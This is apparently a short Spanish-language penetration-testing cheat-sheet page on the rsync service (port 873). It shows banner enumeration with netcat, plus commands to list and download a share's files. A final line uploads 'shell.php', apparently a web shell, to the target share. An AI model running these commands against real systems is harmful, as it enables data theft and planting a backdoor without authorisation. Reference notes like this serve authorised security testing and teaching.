---
title: "Rsync (873)"
layout: "single"
category: "Servicios"
slug: "servicios/rsync"
date: "2025-11-26"
---

### Enumeración
```bash
nc -nv <IP> 873
# Escribe "@RSYNCD: 31.0"
```

### Interactuar
```bash
# Listar
rsync rsync://<IP>/<share>/

# Descargar
rsync -av rsync://<IP>/<share>/ .

# Subir
rsync shell.php rsync://<IP>/<share>/
```
